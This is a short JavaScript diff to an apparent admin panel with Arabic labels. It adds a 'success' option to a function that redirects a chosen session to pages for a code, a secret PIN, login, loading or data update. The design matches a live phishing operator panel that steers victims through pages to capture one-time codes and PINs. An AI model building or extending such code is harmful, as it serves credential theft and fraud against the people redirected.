@@ -437,6 +437,7 @@ function renderDetail(o){
     '<button style="background:#ec4899" onclick="doRedir(\''+esc(o.id)+'\',\'pin\')">🔐 الرقم السري</button>'+
     '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
     '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'loading\')">⏳ الانتظار</button>'+
+    '<button style="background:#16a34a" onclick="doRedir(\''+esc(o.id)+'\',\'success\')">✅ النجاح</button>'+
     '</div>';
   h+='</div>';
 
@@ -514,7 +515,7 @@ function doDecide(id,decision){
 
 function doRedir(id,page){
   api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
-    var labels={code:'الكود',pin:'الرقم السري',login:'تسجيل الدخول',loading:'الانتظار','update-data':'تحديث البيانات'};
+    var labels={code:'الكود',pin:'الرقم السري',login:'تسجيل الدخول',loading:'الانتظار',success:'النجاح','update-data':'تحديث البيانات'};
     showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
 }
 
